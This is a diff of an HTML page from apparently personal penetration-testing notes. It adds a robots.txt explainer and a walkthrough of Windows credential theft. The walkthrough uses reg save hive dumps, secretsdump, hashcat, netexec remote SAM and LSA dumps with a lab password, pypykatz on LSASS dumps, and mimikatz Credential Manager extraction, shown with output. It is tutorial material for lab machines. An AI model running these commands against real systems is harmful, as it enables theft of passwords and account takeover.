@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-99db071c.js";
+            window.path_to_searchindex_js = "searchindex-aef040ee.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-4d2bddd9.js"></script>
+        <script src="toc-0c76121e.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -211,13 +211,10 @@
 <li><a href="#netcat-file-transfer">netcat</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
 <li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
-<li><a href="#john-the-ripper-cheatsheet">john the ripper</a>
-<ul>
+<li><a href="#john-the-ripper-cheatsheet">john the ripper</a></li>
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
 <li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
-</ul>
-</li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -585,7 +582,7 @@
 <ul>
 <li><a href="infosec/README.html">InfoSec</a></li>
 <li><a href="#crawling">crawling</a></li>
-<li><a href="#robots-text">robots-text</a></li>
+<li><a href="#robotstxt">robots.text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
@@ -599,6 +596,9 @@
 <li><a href="#laudanum">Laudanum</a></li>
 <li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
 <li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
+<li><a href="#windows-authentication-process">windows-auth</a></li>
+<li><a href="#attacking-windows-credential-manager">attacking-cred-mgr</a></li>
+<li><a href="#attacking-active-directory">Active Directory Domain Services</a></li>
 </ul>
 </li>
 </ul>
@@ -27963,10 +27963,11 @@ ac
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="infosec"><a class="header" href="#infosec">InfoSec</a></h1>
 <h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
+<h3 id="generic"><a class="header" href="#generic">Generic</a></h3>
 <ul>
 <li><a href="#enumeration-1">enumeration</a></li>
 <li><a href="#crawling">crawling</a></li>
-<li><a href="#robots-text">robots-text</a></li>
+<li><a href="infosec/robots-text.html">robots-text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
@@ -27988,6 +27989,12 @@ ac
 <li><a href="#linux-file-transfer-methods">linux</a></li>
 <li><a href="#windows-file-transfer-methods">windows</a></li>
 </ul>
+<h3 id="windows-1"><a class="header" href="#windows-1">Windows</a></h3>
+<ul>
+<li><a href="#windows-authentication-process">windows-auth</a></li>
+<li><a href="#attacking-active-directory">ADDS</a></li>
+<li><a href="#attacking-windows-credential-manager">credential manager</a></li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="crawling"><a class="header" href="#crawling">Crawling</a></h1>
 <p>Crawling (or spidering) is the automated process of systematically browsing the web to index and collect information from websites. It is commonly used by search engines to gather data for indexing, but it can also be employed for various other purposes, including security assessments, data mining, and competitive analysis. Crawlers, also known as spiders or bots, follow links on web pages to discover new content and extract relevant information.</p>
@@ -28006,7 +28013,71 @@ ac
 </ul>
 <p>Each method has its advantages and disadvantages depending on the use case.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="robots-text"><a class="header" href="#robots-text">robots-text</a></h1>
+<h1 id="robotstxt"><a class="header" href="#robotstxt">robots.txt</a></h1>
+<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
+<p>Imagine you’re a guest at a grand house party. While you’re free to mingle and explore, there might be certain rooms marked “Private” that you’re expected to avoid. This is akin to how <code>robots.txt</code> functions in the world of web crawling. It acts as a virtual “etiquette guide” for bots, outlining which areas of a website they are allowed to access and which are off-limits.</p>
+<h2 id="what-is-robotstxt"><a class="header" href="#what-is-robotstxt">What is robots.txt?</a></h2>
+<p>Technically, <code>robots.txt</code> is a simple text file placed in the root directory of a website (e.g., <code>www.example.com/robots.txt</code>). It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website. This file contains instructions in the form of “directives” that tell bots which parts of the website they can and cannot crawl.</p>
+<h2 id="how-robotstxt-works"><a class="header" href="#how-robotstxt-works">How robots.txt Works</a></h2>
+<p>The directives in <code>robots.txt</code> typically target specific user-agents, which are identifiers for different types of bots. For example, a directive might look like this:</p>
+<pre><code>User-agent: *
+Disallow: /private/
+</code></pre>
+<p>This directive tells all user-agents (<code>*</code> is a wildcard) that they are not allowed to access any URLs that start with <code>/private/</code>. Other directives can allow access to specific directories or files, set crawl delays to avoid overloading a server or provide links to sitemaps for efficient crawling.</p>
+<h2 id="understanding-robotstxt-structure"><a class="header" href="#understanding-robotstxt-structure">Understanding robots.txt Structure</a></h2>
+<p>The <code>robots.txt</code> file is a plain text document that lives in the root directory of a website. It follows a straightforward structure, with each set of instructions, or “record,” separated by a blank line. Each record consists of two main components:</p>
+<ul>
+<li><strong>User-agent</strong>: This line specifies which crawler or bot the following rules apply to. A wildcard (<code>*</code>) indicates that the rules apply to all bots. Specific user agents can also be targeted, such as “Googlebot” (Google’s crawler) or “Bingbot” (Microsoft’s crawler).</li>
+<li><strong>Directives</strong>: These lines provide specific instructions to the identified user-agent.</li>
+</ul>
+<h3 id="common-directives"><a class="header" href="#common-directives">Common Directives</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Directive</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Disallow</code></td><td>Specifies paths or patterns that the bot should not crawl.</td><td><code>Disallow: /admin/</code> (disallow access to the admin directory)</td></tr>
+<tr><td><code>Allow</code></td><td>Explicitly permits the bot to crawl specific paths or patterns, even if they fall under a broader Disallow rule.</td><td><code>Allow: /public/</code> (allow access to the public directory)</td></tr>
+<tr><td><code>Crawl-delay</code></td><td>Sets a delay (in seconds) between successive requests from the bot to avoid overloading the server.</td><td><code>Crawl-delay: 10</code> (10-second delay between requests)</td></tr>
+<tr><td><code>Sitemap</code></td><td>Provides the URL to an XML sitemap for more efficient crawling.</td><td><code>Sitemap: https://www.example.com/sitemap.xml</code></td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="why-respect-robotstxt"><a class="header" href="#why-respect-robotstxt">Why Respect robots.txt?</a></h2>
+<p>While <code>robots.txt</code> is not strictly enforceable (a rogue bot could still ignore it), most legitimate web crawlers and search engine bots will respect its directives. This is important for several reasons:</p>
+<ul>
+<li><strong>Avoiding Overburdening Servers</strong>: By limiting crawler access to certain areas, website owners can prevent excessive traffic that could slow down or even crash their servers.</li>
+<li><strong>Protecting Sensitive Information</strong>: Robots.txt can shield private or confidential information from being indexed by search engines.</li>
+<li><strong>Legal and Ethical Compliance</strong>: In some cases, ignoring <code>robots.txt</code> directives could be considered a violation of a website’s terms of service or even a legal issue, especially if it involves accessing copyrighted or private data.</li>
+</ul>
+<h2 id="robotstxt-in-web-reconnaissance"><a class="header" href="#robotstxt-in-web-reconnaissance">robots.txt in Web Reconnaissance</a></h2>
+<p>For web reconnaissance, <code>robots.txt</code> serves as a valuable source of intelligence. While respecting the directives outlined in this file, security professionals can glean crucial insights into the structure and potential vulnerabilities of a target website:</p>
+<ul>
+<li><strong>Uncovering Hidden Directories</strong>: Disallowed paths in <code>robots.txt</code> often point to directories or files the website owner intentionally wants to keep out of reach from search engine crawlers. These hidden areas might house sensitive information, backup files, administrative panels, or other resources that could interest an attacker.</li>
+<li><strong>Mapping Website Structure</strong>: By analyzing the allowed and disallowed paths, security professionals can create a rudimentary map of the website’s structure. This can reveal sections that are not linked from the main navigation, potentially leading to undiscovered pages or functionalities.</li>
+<li><strong>Detecting Crawler Traps</strong>: Some websites intentionally include “honeypot” directories in <code>robots.txt</code> to lure malicious bots. Identifying such traps can provide insights into the target’s security awareness and defensive measures.</li>
+</ul>
+<h2 id="analyzing-robotstxt"><a class="header" href="#analyzing-robotstxt">Analyzing robots.txt</a></h2>
+<p>Here’s an example of a <code>robots.txt</code> file:</p>
+<pre><code>User-agent: *
+Disallow: /admin/
+Disallow: /private/
+Allow: /public/
+
+User-agent: Googlebot
+Crawl-delay: 10
+
+Sitemap: https://www.example.com/sitemap.xml
+</code></pre>
+<p>This file contains the following directives:</p>
+<ul>
+<li>All user agents are disallowed from accessing the <code>/admin/</code> and <code>/private/</code> directories.</li>
+<li>All user agents are allowed to access the <code>/public/</code> directory.</li>
+<li>The Googlebot (Google’s web crawler) is specifically instructed to wait 10 seconds between requests.</li>
+<li>The sitemap, located at <code>https://www.example.com/sitemap.xml</code>, is provided for easier crawling and indexing.</li>
+</ul>
+<p>By analyzing this <code>robots.txt</code>, we can infer that the website likely has an admin panel located at <code>/admin/</code> and some private content in the <code>/private/</code> directory.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="shell-harnesses"><a class="header" href="#shell-harnesses">Shell Harnesses</a></h1>
 <h2 id="spawning-interactive-shells"><a class="header" href="#spawning-interactive-shells">Spawning Interactive Shells</a></h2>
@@ -28095,7 +28166,7 @@ find . -exec /bin/sh \; -quit
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="well-known-uris"><a class="header" href="#well-known-uris">Well-Known URIs</a></h1>
-<h2 id="overview-12"><a class="header" href="#overview-12">Overview</a></h2>
+<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
 <p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>
 <p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p>
 <p>The Internet Assigned Numbers Authority (IANA) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards.</p>
@@ -28982,7 +29053,7 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 <h1 id="nessus"><a href="#nessus" class="header">nessus</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
-<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
+<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
 <p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
 <p>Laudanum can be downloaded here: https://github.com/jbarcia/Web-Shells/tree/master/laudanum</p>
 <h2 id="using-laudanum"><a class="header" href="#using-laudanum">Using Laudanum</a></h2>
@@ -29266,6 +29337,411 @@ ftp -v -n -s:ftpcommand.txt
 <li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
 <li><strong>Fileless attacks</strong>: Use DownloadString + IEX to execute in memory without touching disk</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windows-authentication-process"><a class="header" href="#windows-authentication-process">Windows Authentication Process</a></h1>
+<p>The Windows client authentication process involves multiple modules responsible for logon, cred retrieval, and verification. There are two authentication protocols available for use within Windows, including NTLM and Kerberos, with Kerberos being the most complex.</p>
+<h2 id="lsa-local-security-authority"><a class="header" href="#lsa-local-security-authority">LSA (Local Security Authority)</a></h2>
+<p>The LSA is the component responsbile for authenticating uses, enforcing security policies, managing logins, and overseeing all aspects of local system security. It also translates usernames to SIDs (Security Identifiers) and manages user sessions.</p>
+<h2 id="windows-authentication-process-diagram"><a class="header" href="#windows-authentication-process-diagram">Windows Authentication Process Diagram</a></h2>
+<p><img src="infosec/windows/images/Auth_process1.png" alt=""></p>
+<p>Local interactive logon is handled via the coordination of several components:</p>
+<ul>
+<li><strong>Winlogon</strong>: Manages user logon and logoff processes.
+<ul>
+<li>Launches <code>LogonUI</code> to prompt for credentials at login</li>
+<li>Handles password changes</li>
+<li>Lock and unlock the workstation</li>
+<li><code>Winlogon</code> is the only process that accepts login requests from the keyboard, which are sent via RPC messages from <code>Win32k.sys</code> (the kernel-mode Win32 subsystem).</li>
+<li>After credentials are collected, <code>Winlogon</code> sends them to <code>LSASS</code> for verification.</li>
+</ul>
+</li>
+<li><strong>LogonUI</strong>: The user interface for logon.</li>
+<li><strong>GINA (Graphical Identification and Authentication)</strong>: Provides the user interface for logon</li>
+<li><strong>SAM</strong>: Stores user account information and credentials locally on the machine.</li>
+<li><strong>LSASS (Local Security Authority Subsystem Service)</strong>: Responsible for enforcing security policies and managing user authentication.
+<ul>
+<li><code>LSASS</code> is comprised of multiple modules and governs all authentication processes.</li>
+<li><code>LSASS</code> is located at <code>C:\Windows\System32\lsass.exe</code> and runs as a protected process.</li>
+<li>Responsible for enforing local security policies, authenticating users, and forwarding security logs to the Even Log.</li>
+<li><code>LSASS</code> is essentially the “gatekeeper” of Windows security.</li>
+<li>After initial login, <code>LSASS</code> will cache credentials in memory, create access tokens, enforce security policies, and manage user sessions.</li>
+</ul>
+</li>
+<li><strong>Msv1_0.dll</strong>: The NTLM authentication package.</li>
+</ul>
+<h2 id="sam-database"><a class="header" href="#sam-database">SAM Database</a></h2>
+<p>The Security Accounts Manager (SAM) database is a critical component of Windows security that stores user account information and credentials locally on the machine. It is used for local authentication and is accessed by the Local Security Authority Subsystem Service (LSASS) during the authentication process. The SAM database contains hashed passwords, user rights, and group memberships, ensuring that user credentials are securely managed and verified during logon attempts.</p>
+<p>SAM is located at <code>C:\Windows\System32\config\SAM</code> and is protected by the operating system to prevent unauthorized access. Direct access to the SAM file is restricted, and it can only be accessed by the system processes, such as LSASS, during authentication.</p>
+<p>Note that for workstations joined to Active Directory Domain Services, SAM is not used. Instead, authentication requests are forwarded to domain controllers, which manage user accounts and credentials for the entire domain.</p>
+<p><code>SYSKEY.exe</code> is a utility that provides an additional layer of security for the SAM database by encrypting its contents. This helps protect user credentials from being easily accessed or compromised.</p>
+<p>SAM is stored in the registry at <code>HKEY_LOCAL_MACHINE\SAM</code>.</p>
+<h3 id="attacking-sam-system-and-security-hives"><a class="header" href="#attacking-sam-system-and-security-hives">Attacking SAM, SYSTEM, and SECURITY Hives</a></h3>
+<p>With administrative access to a Windows system, we can attempt to dump the files associated with the SAM database, copy them to our machine, and use tools like <code>hashcat</code> or <code>John the Ripper</code> to crack the password hashes. Performing this process offline helps avoid detection by not maintaining a persistent session on the target machine.</p>
+<p>There are 3 registry hives on the target machine we can copy (if we have admin access):</p>
+<ul>
+<li><strong>SAM</strong>: Contains user account information and password hashes.</li>
+<li><strong>SYSTEM</strong>: Contains system configuration information, including the system key used to encrypt the SAM. This key is required to decrypt the hashes.</li>
+<li><strong>SECURITY</strong>: Contains security policy information and other security-related data.</li>
+</ul>
+<p>We can backup these hives using the <code>reg save</code> command in an elevated command prompt:</p>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\temp\SAM
+reg save HKLM\SYSTEM C:\Windows\temp\SYSTEM
+reg save HKLM\SECURITY C:\Windows\temp\SECURITY
+</code></pre>
+<p>If we’re only interested in local user accounts, we technically only need the <code>SAM</code> and <code>SYSTEM</code> hives. However, having the <code>SECURITY</code> hive can be useful for other purposes, such as extracting LSA secrets and cached domain credentials.</p>
+<p>We can use Impacket’s <code>secretsdump.py</code> tool to extract the hashes directly from the dumped hives:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
+defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
+bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
+rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
+ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
+dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
+[*] NL$KM 
+ 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....&gt;w4...}..`i
+ 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
+ 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
+ 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
+NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
+[*] Cleaning up... 
+</code></pre>
+<p>Notice that <code>secretsdump.py</code> discovered several hashes. Most modern Windows operating systems use <code>NTLMv2</code> hashes, which are represented by the long strings after the second colon (<code>:</code>). The <code>LM</code> hashes (the shorter strings after the first colon) are often disabled on modern systems for security reasons.</p>
+<p>We can copy these hashes into a text file and attempt to crack them using <code>hashcat</code> or <code>John the Ripper</code>. We only want to copy the <code>NTLMv2</code> hashes for cracking.</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+&lt;SNIP&gt;
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
+6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
+184ecdda8cf1dd238d438c4aea4d560d:adrian          
+31d6cfe0d16ae931b73c59d7e0c089c0:                
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: dumpedhashes.txt
+Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
+Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 5/5 (100.00%) Digests
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 4096/14344385 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: newzealand -&gt; whitetiger
+
+Started: Tue Dec 14 14:16:50 2021
+Stopped: Tue Dec 14 14:16:58 2021
+</code></pre>
+<h3 id="remotely-dumping-lsa-and-sam-secrets"><a class="header" href="#remotely-dumping-lsa-and-sam-secrets">Remotely Dumping LSA and SAM Secrets</a></h3>
+<p>With access to credentials that have local administrator privileges, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
+SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
+</code></pre>
+<p>Similarly, we can use netexec to dump hashes from the SAM database remotely.</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+
+SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
+SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
+
+</code></pre>
+<h2 id="credential-manager"><a class="header" href="#credential-manager">Credential Manager</a></h2>
+<p><img src="infosec/windows/images/authn_credman_credprov.gif" alt=""></p>
+<p>Credential Manager is a Windows feature that securely stores and manages user credentials, such as usernames and passwords, for various applications and services. It allows users to save their login information so that they can easily access resources without having to re-enter their credentials each time.</p>
+<p>The credentials are encrypted and (by default) stored at:
+<code>PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\</code></p>
+<h2 id="ntds-nt-directory-services"><a class="header" href="#ntds-nt-directory-services">NTDS (NT Directory Services)</a></h2>
+<p>NTDS is the database that stores Active Directory data, including user accounts, group memberships, and security policies. It is used for authentication and authorization in domain environments.</p>
+<h2 id="attacking-lsass"><a class="header" href="#attacking-lsass">Attacking LSASS</a></h2>
+<p>With administrative privileges on a Windows system, it is possible to dump the contents of the LSASS process memory and use tools like <code>pypykatz</code> or <code>mimikatz</code> to extract plaintext credentials, NTLM hashes, kerberos tickets, and other sensitive information.</p>
+<p>We can create the dump using Task Manager on the target, transfer the dump to our machine, and then use  <code>pypykatz</code> to analyze it:</p>
+<pre><code class="language-bash">$ pypykatz lsa minidump lsass.dmp
+</code></pre>
+<p><code>pypykatz</code> will parse the dump and extract any credentials it finds, displaying them in a readable format. We can then use <code>hashcat</code> to attempt to crack any NTLM hashes.</p>
+<h3 id="references-3"><a class="header" href="#references-3">References</a></h3>
+<p>hettps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN
+https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication
+https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
+https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-windows-credential-manager"><a class="header" href="#attacking-windows-credential-manager">Attacking Windows Credential Manager</a></h1>
+<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<p>Windows Credential Manager is a built-in feature (since Server 2008 R2 / Windows 7) that allows users and applications to securely store credentials for other systems and websites. Credentials are stored in encrypted folders protected by DPAPI.</p>
+<h2 id="credential-storage-locations-1"><a class="header" href="#credential-storage-locations-1">Credential Storage Locations</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Path</th><th>Scope</th></tr>
+</thead>
+<tbody>
+<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></td><td>User</td></tr>
+<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></td><td>User</td></tr>
+<tr><td><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></td><td>User</td></tr>
+<tr><td><code>%ProgramData%\Microsoft\Vault\</code></td><td>System</td></tr>
+<tr><td><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></td><td>System</td></tr>
+</tbody>
+</table>
+</div>
+<p>Each vault contains a <code>Policy.vpol</code> file with AES keys (AES-128/256) protected by DPAPI. Credential Guard (newer Windows) further protects DPAPI master keys using VBS (Virtualization-based Security).</p>
+<h2 id="credential-types-1"><a class="header" href="#credential-types-1">Credential Types</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Web Credentials</td><td>Credentials for websites/online accounts (used by IE and legacy Edge)</td></tr>
+<tr><td>Windows Credentials</td><td>Login tokens for services (OneDrive), domain users, network resources, shared directories</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="enumeration-with-cmdkey"><a class="header" href="#enumeration-with-cmdkey">Enumeration with cmdkey</a></h2>
+<p>List stored credentials for the current user:</p>
+<pre><code class="language-cmd">cmdkey /list
+</code></pre>
+<p>Output fields:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Target</td><td>Resource/account name (computer, domain, or identifier)</td></tr>
+<tr><td>Type</td><td>Credential kind: <code>Generic</code> (general) or <code>Domain Password</code> (domain logon)</td></tr>
+<tr><td>User</td><td>Associated user account</td></tr>
+<tr><td>Persistence</td><td><code>Local machine persistence</code> = survives reboots</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="impersonation-with-runas"><a class="header" href="#impersonation-with-runas">Impersonation with runas</a></h2>
+<p>When a <code>Domain:interactive=</code> credential is found, impersonate the stored user:</p>
+<pre><code class="language-cmd">runas /savecred /user:DOMAIN\username cmd
+</code></pre>
+<h2 id="exporting-vaults"><a class="header" href="#exporting-vaults">Exporting Vaults</a></h2>
+<p>Export via GUI:</p>
+<pre><code class="language-cmd">rundll32 keymgr.dll,KRShowKeyMgr
+</code></pre>
+<p>Exports are password-encrypted <code>.crd</code> files, importable on other Windows systems.</p>
+<h2 id="credential-extraction-with-mimikatz"><a class="header" href="#credential-extraction-with-mimikatz">Credential Extraction with Mimikatz</a></h2>
+<p>Dump credentials from LSASS memory using the <code>sekurlsa</code> module:</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # sekurlsa::credman
+</code></pre>
+<p>Alternative: manually decrypt using the <code>dpapi</code> module.</p>
+<h2 id="related-tools-5"><a class="header" href="#related-tools-5">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><a href="tools/mimikatz.html">Mimikatz</a></td><td>Windows credential extraction and manipulation</td></tr>
+<tr><td>SharpDPAPI</td><td>C# implementation for DPAPI attacks</td></tr>
+<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
+<tr><td>DonPAPI</td><td>Remote DPAPI credential extraction</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="mitre-attck-reference"><a class="header" href="#mitre-attck-reference">MITRE ATT&amp;CK Reference</a></h2>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1555/004/">T1555.004 - Credentials from Password Stores: Windows Credential Manager</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-active-directory"><a class="header" href="#attacking-active-directory">Attacking Active Directory</a></h1>
+<p>We can attempt to extract credentials from Active Directory (ADDS) using dictionary attacks against AD accounts and dumping hashing from the ntds.dit file.</p>
